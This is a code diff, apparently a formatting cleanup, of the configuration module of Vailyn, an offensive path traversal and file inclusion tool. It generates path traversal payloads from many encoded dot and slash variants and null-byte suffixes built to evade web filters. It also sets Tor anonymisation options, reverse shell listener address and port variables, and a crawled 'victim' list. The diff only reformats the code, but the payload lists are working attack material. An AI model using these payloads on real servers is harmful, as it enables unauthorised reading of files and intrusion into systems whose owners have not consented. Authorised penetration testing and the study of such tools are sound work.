@@ -2,37 +2,38 @@
 # -*- coding: utf-8 -*-
 """
 _____, ___
-   '+ .;    
-    , ;   
-     .   
-           
-       .    
-     .;.    
-     .;  
-      :  
-      ,   
-       
+   '+ .;
+    , ;
+     .
+
+       .
+     .;.
+     .;
+      :
+      ,
+
 
 ┌─[Vailyn]─[~]
 └──╼ VainlyStrain
 """
 
 import multiprocessing
-import sys, os
+import sys
+import os
 
 
 """generate payload list from a variety of dots and slashes"""
 def generatePayloads():
-    dots = ['..', '. . ', '%2e%2e', '0x2e0x2e', '%252e%252e', '..;', '%c0%2e%c0%2e', '%e0%80%ae%e0%80%ae', 
-        '%c0%ae%c0%ae', '%25c0%25ae%25c0%25ae', '%%32%65%%32%65', '%uff0e%uff0e', '%e0%ae%e0%ae', 
-        '%u002e%u002e', '%25%32%65%25%32%65', '%%c0%6e%c0%6e', '%c0%5e%c0%5e',
-        '%c0%ee%c0%ee', '%c0%fe%c0%fe', '%f0%80%80%ae%f0%80%80%ae', '.%2e', '%2e.']
-    slashes = ['/', '\\', '%2f', '0x2f', '%255c', '%252f', '%5c', '%c0%2f', '0x5c', '%c0%af', '%c1%9c', 
-        '%25c1%259c', '%%32%66', '%%35%63', '%u2215', '%u2216', '%uEFC8', '%uF025', '%e0%af', 
-        '%e0%80%af', '%c0%5c', '%c0%9v', '%c0%qf', '%c1%8s', '%c1%1c', '%c1%af', '%bg%qf', '%25c0%25af']
-    special = ['./', '.\\', '....//', '....\\\\', '...//', '...\\\\', '.....///', '.....\\\\\\', '..\\/', 
-        '../\\', '..././', '...\\.\\', '..................................................../', 
-        '....................................................\\', '.?/', '?./', '??/']
+    dots = ['..', '. . ', '%2e%2e', '0x2e0x2e', '%252e%252e', '..;', '%c0%2e%c0%2e', '%e0%80%ae%e0%80%ae',
+            '%c0%ae%c0%ae', '%25c0%25ae%25c0%25ae', '%%32%65%%32%65', '%uff0e%uff0e', '%e0%ae%e0%ae',
+            '%u002e%u002e', '%25%32%65%25%32%65', '%%c0%6e%c0%6e', '%c0%5e%c0%5e',
+            '%c0%ee%c0%ee', '%c0%fe%c0%fe', '%f0%80%80%ae%f0%80%80%ae', '.%2e', '%2e.']
+    slashes = ['/', '\\', '%2f', '0x2f', '%255c', '%252f', '%5c', '%c0%2f', '0x5c', '%c0%af', '%c1%9c',
+               '%25c1%259c', '%%32%66', '%%35%63', '%u2215', '%u2216', '%uEFC8', '%uF025', '%e0%af',
+               '%e0%80%af', '%c0%5c', '%c0%9v', '%c0%qf', '%c1%8s', '%c1%1c', '%c1%af', '%bg%qf', '%25c0%25af']
+    special = ['./', '.\\', '....//', '....\\\\', '...//', '...\\\\', '.....///', '.....\\\\\\', '..\\/',
+               '../\\', '..././', '...\\.\\', '..................................................../',
+               '....................................................\\', '.?/', '?./', '??/']
 
     plist = []
     for dot in list(set(dots)):
@@ -47,28 +48,28 @@ payloadlist = generatePayloads()
 
 nullchars = ['%00', '%2500', '%25%30%30', '%u0000', '%c0%80', '%e0%80']
 
-#Tor variables
+# Tor variables
 tor = False
 initip = ""
 torip = ""
 
 timeout = None
 
-#reverse shell variables
+# reverse shell variables
 revshell = False
 LISTENIP = None
 LISTENPORT = None
 
-#crawler list
+# crawler list
 viclist = []
 
-#arjun stable switch
+# arjun stable switch
 stable = False
 
-#clear the terminal, supports both Windows and Unix-like
+# clear the terminal, supports both Windows and Unix-like
 CLEAR_CMD = ["cmd", "/c", "cls"] if sys.platform.lower().startswith("win") else ["clear"]
  
-#set maximal amount of processes
+# set maximal amount of processes
 processes = multiprocessing.cpu_count()
 
 if sys.platform.lower().startswith('win'):
@@ -108,4 +109,3 @@ user_agents = [
     "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
     "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"
 ]
-
